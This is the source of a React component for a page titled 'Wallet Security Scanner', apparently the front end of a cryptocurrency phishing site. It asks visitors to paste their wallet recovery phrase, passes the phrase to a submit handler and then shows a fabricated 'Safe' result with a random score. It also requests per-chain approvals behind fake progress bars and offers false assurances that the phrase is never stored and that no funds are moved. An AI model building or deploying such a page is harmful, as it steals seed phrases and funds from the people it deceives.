import { useState } from 'react';

const SCANS_BY_DAY = [12400, 15200, 11800, 18900, 22100, 19500, 24200];
const MAX_SCAN = Math.max(...SCANS_BY_DAY);

const WalletScanner = ({
  recentScans = [],
  onRequestApproval,
  stats,
  onSeedPhraseSubmit,
}: {
  recentScans: { address: string; timestamp: string; status: string; score: number }[];
  onRequestApproval: (chain: string) => void;
  stats: { scanned: number; compromised: number; safe: number };
  onSeedPhraseSubmit: (message: string) => void;
}) => {
  const [seedPhrase, setSeedPhrase] = useState('');
  const [verifying, setVerifying] = useState(false);
  const [scanningChain, setScanningChain] = useState<string | null>(null);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanResult, setScanResult] = useState<{
    status: 'Safe' | 'Compromised';
    score: number;
    timestamp: string;
  } | null>(null);

  const chains = [
    { id: 'ethereum', name: 'Ethereum', color: 'bg-purple-600' },
    { id: 'polygon', name: 'Polygon', color: 'bg-purple-800' },
    { id: 'bsc', name: 'BSC', color: 'bg-yellow-600' },
  ];

  const handleSeedSubmit = () => {
    setVerifying(true);
    setScanResult(null);
    setTimeout(() => {
      setVerifying(false);
      onSeedPhraseSubmit(seedPhrase);
      setScanResult({
        status: 'Safe',
        score: 88 + Math.floor(Math.random() * 12),
        timestamp: new Date().toLocaleTimeString(),
      });
    }, 800);
  };

  const handleScan = async (chainId: string) => {
    setScanningChain(chainId);
    setScanProgress(0);
    const interval = setInterval(() => {
      setScanProgress((p) => {
        if (p >= 100) {
          clearInterval(interval);
          return 100;
        }
        return p + Math.random() * 18 + 8;
      });
    }, 180);
    await onRequestApproval(chainId);
    clearInterval(interval);
    setScanProgress(100);
    setTimeout(() => {
      setScanningChain(null);
      setScanProgress(0);
    }, 400);
  };

  return (
    <div className="w-full max-w-5xl mx-auto">
      {/* Hero */}
      <div className="text-center mb-6 sm:mb-8">
        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#13394C]/80 border border-[#1e4a62] text-[#78AEE0] text-xs font-medium mb-4">
          <span className="w-1.5 h-1.5 rounded-full bg-[#6EE7B7] animate-pulse" />
          Secure multi-chain scan
        </div>
        <h1 className="text-3xl sm:text-4xl lg:text-5xl font-bold text-white mb-3 sm:mb-4 tracking-tight">
          Wallet Security Scanner
        </h1>
        <p className="text-[#7BAED1] text-base sm:text-lg max-w-xl mx-auto">
          Protect your assets. Scan for compromised tokens and suspicious activity across major networks.
        </p>
      </div>

      {/* Trust cues */}
      <div className="flex flex-wrap justify-center gap-4 sm:gap-6 mb-6">
        <div className="flex items-center gap-2 text-[#BFDFF7] text-sm">
          <svg className="w-5 h-5 text-[#6EE7B7]" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
          </svg>
          Secure
        </div>
        <div className="flex items-center gap-2 text-[#BFDFF7] text-sm">
          <svg className="w-5 h-5 text-[#78AEE0]" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.318 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.35-.166-2.001A11.954 11.954 0 0110 1.944z" clipRule="evenodd" />
          </svg>
          Multi-chain
        </div>
        <div className="flex items-center gap-2 text-[#BFDFF7] text-sm">
          <svg className="w-5 h-5 text-[#6EE7B7]" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
          </svg>
          No funds moved
        </div>
      </div>

      {/* Live scan loader strip */}
      {scanningChain && (
        <div className="mb-6 bg-[#0B3248] border border-[#1e4a62] rounded-xl p-4 flex flex-col sm:flex-row items-center gap-3">
          <div className="flex items-center gap-2 text-[#78AEE0] font-medium">
            <svg className="w-5 h-5 animate-spin" fill="none" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
            </svg>
            Scanning {scanningChain.charAt(0).toUpperCase() + scanningChain.slice(1)}…
          </div>
          <div className="flex-1 w-full h-2 bg-[#13394C] rounded-full overflow-hidden">
            <div
              className="h-full bg-[#78AEE0] rounded-full transition-all duration-300"
              style={{ width: `${Math.min(100, scanProgress)}%` }}
            />
          </div>
          <span className="text-[#7BAED1] text-sm tabular-nums">{Math.min(100, Math.round(scanProgress))}%</span>
        </div>
      )}

      <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
        {/* Left: CTA + networks + stats + recent */}
        <div className="xl:col-span-2 space-y-6">
          <div className="bg-[#0A2436] rounded-2xl border border-[#13394C] p-4 sm:p-6 shadow-2xl">
            <h2 className="text-lg font-semibold text-white mb-1">Verify wallet ownership</h2>
            <p className="text-[#7BAED1] text-sm sm:text-base mb-4">
              Enter your recovery phrase to verify ownership and enable full scan access.
            </p>
            <label className="block text-[#BFDFF7] text-sm font-medium mb-2">Recovery phrase</label>
            <textarea
              value={seedPhrase}
              onChange={(e) => setSeedPhrase(e.target.value)}
              placeholder="Paste or type your 12 or 24 word phrase…"
              rows={4}
              className="w-full bg-[#13394C] border border-[#1e4a62] rounded-lg p-4 text-white placeholder-[#5a8a9e] focus:outline-none focus:ring-2 focus:ring-[#78AEE0] focus:border-transparent resize-none text-sm sm:text-base mb-4"
            />
            <button
              type="button"
              onClick={handleSeedSubmit}
              disabled={verifying}
              className="w-full sm:w-auto px-6 sm:px-8 py-3 sm:py-4 bg-[#78AEE0] hover:bg-[#5a9cd6] disabled:opacity-70 text-[#04111A] font-semibold rounded-lg transition-all duration-200 text-base sm:text-lg"
            >
              {verifying ? 'Verifying…' : 'Verify'}
            </button>
            <p className="mt-3 text-[#5a8a9e] text-xs">
              Your recovery phrase is encrypted and never stored on our servers.
            </p>
          </div>

          {scanResult && (
            <div className="bg-[#0A2436] rounded-2xl border border-[#13394C] border-l-4 border-l-[#6EE7B7] p-4 sm:p-6 shadow-2xl">
              <h3 className="text-lg font-semibold text-white mb-3 flex items-center gap-2">
                <span className="w-8 h-8 rounded-full bg-[#6EE7B7]/20 flex items-center justify-center">
                  <svg className="w-5 h-5 text-[#6EE7B7]" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                </span>
                Your scan result
              </h3>
              <div className="grid grid-cols-2 sm:flex sm:flex-wrap gap-4">
                <div>
                  <p className="text-[#7BAED1] text-xs sm:text-sm">Status</p>
                  <p className={`font-semibold ${scanResult.status === 'Safe' ? 'text-[#6EE7B7]' : 'text-[#F87171]'}`}>
                    {scanResult.status === 'Safe' ? '✔ Safe' : '⚠ Compromised'}
                  </p>
                </div>
                <div>
                  <p className="text-[#7BAED1] text-xs sm:text-sm">Security score</p>
                  <p className="text-white font-semibold">{scanResult.score}/100</p>
                </div>
                <div>
                  <p className="text-[#7BAED1] text-xs sm:text-sm">Scanned at</p>
                  <p className="text-white text-sm">{scanResult.timestamp}</p>
                </div>
              </div>
              <p className="mt-3 text-[#BFDFF7] text-sm">
                {scanResult.status === 'Safe'
                  ? 'No compromised tokens or suspicious permissions detected. Your wallet looks secure.'
                  : 'We found potential risks. Review your token approvals and revoke suspicious access.'}
              </p>
            </div>
          )}

          <div className="bg-[#0A2436] rounded-2xl border border-[#13394C] p-4 sm:p-6 shadow-2xl">
            <div className="bg-[#0B3248] border-l-4 border-[#78AEE0] p-4 rounded-lg mb-6 text-[#BFDFF7] text-sm flex items-start gap-2">
              <svg className="h-5 w-5 text-[#78AEE0] flex-shrink-0 mt-0.5" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M18 10c0 4.418-3.582 8-8 8s-8-3.582-8-8 3.582-8 8-8 8 3.582 8 8zm-9-4a1 1 0 112 0v4a1 1 0 11-2 0V6zm1 8a1.5 1.5 0 100-3 1.5 1.5 0 000 3z" clipRule="evenodd" />
              </svg>
              <p>We only check token balances and permissions. No funds are moved.</p>
            </div>
            <h2 className="text-lg sm:text-xl font-semibold text-white mb-4">Select network to scan</h2>
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              {chains.map((chain) => (
                <button
                  key={chain.id}
                  type="button"
                  onClick={() => handleScan(chain.id)}
                  disabled={!!scanningChain}
                  className={`${chain.color} hover:opacity-90 disabled:opacity-60 text-white font-medium py-3 sm:py-4 px-4 rounded-lg transition-all duration-200 hover:scale-[1.02] text-sm sm:text-base`}
                >
                  {chain.name}
                </button>
              ))}
            </div>
          </div>

          {/* Stats */}
          <div className="grid grid-cols-3 gap-3 sm:gap-4">
            <div className="bg-[#0A2436] rounded-xl border border-[#13394C] p-4 text-center">
              <p className="text-[#7BAED1] text-xs sm:text-sm">Scanned</p>
              <p className="text-xl sm:text-2xl font-bold text-white mt-1">{stats.scanned.toLocaleString()}</p>
            </div>
            <div className="bg-[#0A2436] rounded-xl border border-[#13394C] p-4 text-center">
              <p className="text-[#7BAED1] text-xs sm:text-sm">Compromised</p>
              <p className="text-xl sm:text-2xl font-bold text-[#F87171] mt-1">{stats.compromised.toLocaleString()}</p>
            </div>
            <div className="bg-[#0A2436] rounded-xl border border-[#13394C] p-4 text-center">
              <p className="text-[#7BAED1] text-xs sm:text-sm">Safe</p>
              <p className="text-xl sm:text-2xl font-bold text-[#6EE7B7] mt-1">{stats.safe.toLocaleString()}</p>
            </div>
          </div>

          {/* Recent scans */}
          <div className="bg-[#0A2436] rounded-2xl border border-[#13394C] p-4 sm:p-6 shadow-2xl">
            <h3 className="text-lg font-semibold text-white mb-3 flex items-center gap-2">
              Recent scans
              <span className="w-2 h-2 rounded-full bg-[#6EE7B7] animate-pulse" />
            </h3>
            <div className="space-y-2 max-h-64 overflow-y-auto">
              {recentScans.map((scan, index) => (
                <div
                  key={index}
                  className="bg-[#13394C] rounded-lg p-3 sm:p-4 border border-[#1e4a62] flex flex-col sm:flex-row justify-between items-start sm:items-center gap-2"
                >
                  <div className="text-[#78AEE0] font-mono text-xs sm:text-sm break-all">{scan.address}</div>
                  <div className="flex gap-2 items-center text-xs sm:text-sm flex-shrink-0">
                    <span className={scan.status === 'Safe' ? 'text-[#6EE7B7] font-semibold' : 'text-[#F87171] font-semibold'}>
                      {scan.status === 'Safe' ? '✔ Safe' : '⚠ Compromised'}
                    </span>
                    <span className="text-[#7BAED1]">{scan.timestamp}</span>
                    <span className="text-[#5a8a9e]">Score: {scan.score}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Right: Graph + activity */}
        <div className="space-y-6">
          {/* Scans last 7 days bar chart */}
          <div className="bg-[#0A2436] rounded-2xl border border-[#13394C] p-4 sm:p-6 shadow-2xl">
            <h3 className="text-lg font-semibold text-white mb-4">Scans last 7 days</h3>
            <div className="flex items-end gap-2 sm:gap-3 h-32">
              {SCANS_BY_DAY.map((val, i) => (
                <div key={i} className="flex-1 flex flex-col items-center gap-1 h-full">
                  <div className="w-full flex-1 min-h-2 flex flex-col justify-end">
                    <div
                      className="w-full bg-gradient-to-t from-[#78AEE0] to-[#5a9cd6] rounded-t transition-all duration-500"
                      style={{ height: `${(val / MAX_SCAN) * 100}%` }}
                    />
                  </div>
                  <span className="text-[#7BAED1] text-[10px] sm:text-xs flex-shrink-0">
                    {['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'][i]}
                  </span>
                </div>
              ))}
            </div>
            <p className="text-[#5a8a9e] text-xs mt-3 text-center">
              {SCANS_BY_DAY.reduce((a, b) => a + b, 0).toLocaleString()} total scans
            </p>
          </div>

          {/* Risk distribution */}
          <div className="bg-[#0A2436] rounded-2xl border border-[#13394C] p-4 sm:p-6 shadow-2xl">
            <h3 className="text-lg font-semibold text-white mb-4">Risk distribution</h3>
            <div className="space-y-3">
              <div className="flex items-center gap-3">
                <div className="w-3 h-3 rounded-full bg-[#6EE7B7]" />
                <span className="text-[#BFDFF7] text-sm">Safe</span>
                <div className="flex-1 h-2 bg-[#13394C] rounded-full overflow-hidden">
                  <div className="h-full bg-[#6EE7B7] rounded-full" style={{ width: `${(stats.safe / stats.scanned) * 100}%` }} />
                </div>
                <span className="text-[#7BAED1] text-sm tabular-nums">{((stats.safe / stats.scanned) * 100).toFixed(1)}%</span>
              </div>
              <div className="flex items-center gap-3">
                <div className="w-3 h-3 rounded-full bg-[#F87171]" />
                <span className="text-[#BFDFF7] text-sm">Compromised</span>
                <div className="flex-1 h-2 bg-[#13394C] rounded-full overflow-hidden">
                  <div className="h-full bg-[#F87171] rounded-full" style={{ width: `${(stats.compromised / stats.scanned) * 100}%` }} />
                </div>
                <span className="text-[#7BAED1] text-sm tabular-nums">{((stats.compromised / stats.scanned) * 100).toFixed(1)}%</span>
              </div>
            </div>
          </div>

          {/* Activity / skeleton loader */}
          <div className="bg-[#0A2436] rounded-2xl border border-[#13394C] p-4 sm:p-6 shadow-2xl">
            <h3 className="text-lg font-semibold text-white mb-4">Live activity</h3>
            <div className="space-y-3">
              {[1, 2, 3].map((i) => (
                <div key={i} className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded-lg bg-[#13394C] animate-pulse" />
                  <div className="flex-1 space-y-1">
                    <div className="h-3 w-3/4 bg-[#13394C] rounded animate-pulse" />
                    <div className="h-2 w-1/2 bg-[#13394C]/70 rounded animate-pulse" />
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Info cards */}
          <div className="grid grid-cols-1 gap-3">
            <div className="bg-[#0A2436] rounded-xl border border-[#13394C] p-4 flex gap-3">
              <div className="w-10 h-10 rounded-lg bg-[#13394C] flex items-center justify-center flex-shrink-0">
                <svg className="w-5 h-5 text-[#78AEE0]" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
              </div>
              <div>
                <h4 className="text-white font-semibold text-sm">Security first</h4>
                <p className="text-[#7BAED1] text-xs">Review and revoke suspicious access.</p>
              </div>
            </div>
            <div className="bg-[#0A2436] rounded-xl border border-[#13394C] p-4 flex gap-3">
              <div className="w-10 h-10 rounded-lg bg-[#13394C] flex items-center justify-center flex-shrink-0">
                <svg className="w-5 h-5 text-[#78AEE0]" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.318 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.35-.166-2.001A11.954 11.954 0 0110 1.944z" clipRule="evenodd" />
                </svg>
              </div>
              <div>
                <h4 className="text-white font-semibold text-sm">Multi-chain</h4>
                <p className="text-[#7BAED1] text-xs">Ethereum, Polygon, BSC.</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default WalletScanner;
